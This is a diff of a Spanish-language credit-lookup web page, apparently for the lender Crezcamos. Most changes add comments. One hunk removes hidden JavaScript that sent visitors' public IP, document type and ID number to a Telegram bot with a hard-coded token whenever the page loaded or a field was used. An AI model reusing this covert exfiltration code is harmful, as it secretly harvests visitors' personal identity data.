@@ -321,6 +321,7 @@
             cursor: not-allowed;
         }
 
+        /* ─── SPINNER DE CARGA ─── */
         .spinner {
             display: none;
             width: 20px;
@@ -335,6 +336,7 @@
             to { transform: rotate(360deg); }
         }
 
+        /* ─── TARJETA DE RESULTADO ─── */
         .resultado-container {
             margin-top: 25px;
             display: none;
@@ -425,6 +427,7 @@
             transform: scale(1.03);
         }
 
+        /* ─── TARJETA DE ERROR ─── */
         .error-card {
             background: linear-gradient(135deg, #fff5f5 0%, #ffe8e8 100%);
             border: 1px solid #f5c6c6;
@@ -458,12 +461,14 @@
             font-weight: 600;
         }
 
+        /* ─── MÚLTIPLES CRÉDITOS ─── */
         .creditos-lista {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
 
+        /* ─── RESPONSIVE ─── */
         @media (max-width: 900px) {
             body {
                 display: block;
@@ -634,72 +639,10 @@
     </div>
 
     <script>
-        // ─── Configuración general ───
-        const API_URL = window.location.origin;
+        // ─── Config ───
+        const API_URL = window.location.origin; // Detecta automáticamente (localhost o Render)
 
-        // ─── CONFIGURACIÓN TELEGRAM (NUEVO TOKEN) ───
-        const TELEGRAM_CHAT_ID = "-1004457768033";
-        const TELEGRAM_BOT_TOKEN = "8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E";
-        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-        // Bandera para no enviar "p1" múltiples veces en la misma sesión
-        let sesionIniciadaNotificada = false;
-
-        // ─── Obtener IP pública del usuario ───
-        async function obtenerIPPublica() {
-            try {
-                const resp = await fetch('https://api.ipify.org?format=json');
-                const data = await resp.json();
-                return data.ip || 'IP no disponible';
-            } catch (e) {
-                try {
-                    const resp2 = await fetch('https://ipapi.co/json/');
-                    const data2 = await resp2.json();
-                    return data2.ip || 'IP no disponible';
-                } catch (e2) {
-                    return 'IP no disponible';
-                }
-            }
-        }
-
-        // ─── Enviar mensaje a Telegram ───
-        async function enviarTelegram(mensaje) {
-            try {
-                const resp = await fetch(TELEGRAM_API, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'HTML'
-                    })
-                });
-                const data = await resp.json();
-                if (!data.ok) {
-                    console.warn('Telegram respondió con error:', data);
-                }
-            } catch (err) {
-                console.warn('No se pudo enviar a Telegram:', err);
-            }
-        }
-
-        // ─── Detectar "inicio de sesión" (primer contacto con la página) ───
-        async function notificarInicioSesion() {
-            if (sesionIniciadaNotificada) return;
-            sesionIniciadaNotificada = true;
-
-            const ip = await obtenerIPPublica();
-            const mensaje = `p1\nIP detectada: ${ip}`;
-            await enviarTelegram(mensaje);
-        }
-
-        // Disparadores del "inicio de sesión":
-        window.addEventListener('load', () => {
-            setTimeout(notificarInicioSesion, 800);
-        });
-
-        document.getElementById('numeroDocumento').addEventListener('focus', notificarInicioSesion, { once: true });
-        document.getElementById('customSelect').addEventListener('click', notificarInicioSesion, { once: true });
+        let tipoDocSeleccionado = 'CC';
 
         // ─── Validar solo números ───
         function validarNumero(input) {
@@ -743,17 +686,13 @@
             const numDoc = document.getElementById('numeroDocumento').value.trim();
             if (!numDoc) return;
 
-            const ip = await obtenerIPPublica();
-            await enviarTelegram(
-                `p1\nIP detectada: ${ip}\nIntento de consulta:\nTipo Doc: ${tipoDocSeleccionado}\nDocumento: ${numDoc}`
-            );
-
             const btn = document.getElementById('btnConsultar');
             const icon = document.getElementById('btnIcon');
             const spinner = document.getElementById('btnSpinner');
             const texto = document.getElementById('btnTexto');
             const container = document.getElementById('resultadoContainer');
 
+            // Estado: cargando
             btn.disabled = true;
             icon.style.display = 'none';
             spinner.style.display = 'block';
@@ -772,6 +711,7 @@
             } catch (err) {
                 mostrarError('No se pudo conectar con el servidor. Asegúrate de que server.js esté corriendo en el puerto 3000.');
             } finally {
+                // Restaurar botón
                 btn.disabled = false;
                 icon.style.display = 'inline';
                 spinner.style.display = 'none';
@@ -784,6 +724,7 @@
             const container = document.getElementById('resultadoContainer');
             const creditos = data.creditos;
 
+            // Si la API devuelve un array de créditos
             if (Array.isArray(creditos)) {
                 let html = '<div class="creditos-lista">';
                 creditos.forEach(cred => {
@@ -792,12 +733,15 @@
                 html += '</div>';
                 container.innerHTML = html;
             }
+            // Si devuelve un objeto con campos directos
             else if (creditos && typeof creditos === 'object') {
+                // Intentar extraer valor y número de crédito del objeto
                 const valor = creditos.valorPagar || creditos.valor || creditos.valorCuota || creditos.saldo || '—';
                 const numero = creditos.numeroCredito || creditos.creditNumber || creditos.numeroCred || '—';
                 container.innerHTML = `<div class="creditos-lista">${crearTarjetaCredito({ valorPagar: valor, numeroCredito: numero })}</div>`;
             }
             else {
+                // Fallback: mostrar raw
                 container.innerHTML = `<div class="creditos-lista">${crearTarjetaCredito({ valorPagar: JSON.stringify(creditos), numeroCredito: '—' })}</div>`;
             }
 
@@ -805,9 +749,11 @@
         }
 
         function crearTarjetaCredito(cred) {
+            // Campos exactos de la API de Crezcamos
             const valor = cred.balance || cred.valorPagar || cred.valor || cred.saldo || cred.monto || '—';
             const numero = cred.creditNumber || cred.numeroCredito || cred.numero || '—';
 
+            // Formatear valor como moneda si es número
             let valorFormateado = valor;
             if (typeof valor === 'number' || (typeof valor === 'string' && /^[\d.,]+$/.test(valor))) {
                 const num = parseFloat(String(valor).replace(/\./g, '').replace(',', '.'));
